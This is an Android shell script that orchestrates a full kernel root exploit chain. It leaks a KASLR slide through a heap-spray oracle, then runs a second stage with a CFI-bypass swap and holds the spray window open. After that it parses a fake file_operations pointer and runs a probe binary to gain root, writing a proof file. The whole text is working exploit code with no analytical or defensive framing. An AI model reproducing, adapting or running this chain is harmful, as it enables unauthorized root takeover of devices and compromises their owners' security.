#!/system/bin/sh
# rw_chain.sh — FULL root chain, device-side only (survives adb death).
# Launched detached from host. Writes progress to /data/local/tmp/rw_chain.log
# and proof to /data/local/tmp/ROOTED.
D=/data/local/tmp
L=$D/rw_chain.log
log() { echo "$(date +%H:%M:%S) $*" >> $L; }

log "chain start"

# ---- 1) O-fire: sprayed oracle ----
rm -f $D/gl_out.txt
MODE4_ONLY=1 MODE4_SLIDE=1 MODE4_SLIDE_SPRAY=1 MODE4_SWAP_NOCFI=1 \
  $D/gl_rw > $D/gl_out.txt 2>&1
log "O-fire exit=$?"

# ---- 2) decode (device-side) ----
SLIDE=$($D/slide_dec)
log "slide=$SLIDE"
case "$SLIDE" in 0x*) ;; *) log "ORACLE MISS — chain ends"; exit 1;; esac

# ---- 3) N-fire: swap + HOLD, detached ----
rm -f $D/gl_out.txt
MODE4_ONLY=1 MODE4_SLIDE_SWAP=1 KASLR_SLIDE=$SLIDE MODE4_SWAP_NOCFI=1 \
  MODE4_SWAP_HOLD=1 $D/gl_rw > $D/gl_out.txt 2>&1 &
NPID=$!
log "N-fire pid=$NPID"

# ---- 4) poll for HOLD marker (swap live) ----
HOLD=0
i=0
while [ $i -lt 120 ]; do
  if grep -q 'SWAP_HOLD\|HOLD: spray live' $D/gl_out.txt 2>/dev/null; then
    HOLD=1; break
  fi
  if ! kill -0 $NPID 2>/dev/null; then
    # process gone: did it hold or exit?
    grep -q 'SWAP_HOLD\|HOLD: spray live' $D/gl_out.txt 2>/dev/null && { HOLD=1; break; }
    log "N-fire exited early"; break
  fi
  sleep 2
  i=$((i+1))
done
if [ $HOLD -ne 1 ]; then
  log "NO HOLD (walk miss) — chain ends"
  exit 1
fi
log "WINDOW OPEN"

# ---- 5) parse fake_fops + gl pid, run probe ----
FF=$(grep -o 'fake_fops (ffffff[0-9a-f]*)' $D/gl_out.txt | tail -1 | grep -o 'ffffff[0-9a-f]*')
GLPID=$(grep -o 'pid=[0-9]*' $D/gl_out.txt | head -1 | cut -d= -f2)
log "probe: ff=$FF slide=$SLIDE glpid=$GLPID"
case "$FF" in ffffff*) ;; *) log "no fake_fops parsed"; exit 1;; esac

$D/swap_probe $FF $SLIDE $GLPID > $D/probe_out.txt 2>&1
PRC=$?
log "probe exit=$PRC"
log "$(tail -8 $D/probe_out.txt | tr '\\n' '|')"
if [ -f $D/ROOTED ]; then
  log "*** ROOT PROOF WRITTEN ***"
fi
exit $PRC
